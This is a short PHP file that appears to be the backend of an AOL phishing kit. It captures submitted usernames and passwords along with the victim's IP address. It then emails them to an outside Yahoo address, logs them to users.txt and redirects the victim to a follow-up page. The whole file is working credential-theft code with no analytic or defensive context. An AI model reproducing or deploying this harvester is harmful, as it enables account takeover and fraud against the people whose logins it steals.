<?php
$ip = getenv("REMOTE_ADDR");
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$hostname = gethostbyaddr($ip);
$message .= "--------------+ Created By [ T-Soft Technologies ] +------------\n";
$message .= "--------------+AOL UserLogin +------------\n";
$message .= "Username             : ".$_POST['username']."\n";
$message .= "Password            : ".$_POST['password']."\n";

$message .= "IP                     : ".$ip."\n";
$message .= "---------+ T-Soft Technologies @ 2017 +-------\n";


$recipient = "amapounds@yahoo.com";
$subject = "AOL INFO BY T-Soft Technologies $ip";
$headers = "From: Admin<admin@tsoft.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "Version: 2.1\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   
		   
		      $fp = fopen("users.txt","a");
fputs($fp,$message);
fclose($fp);
		   
		   header("Location: checkup.php");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>
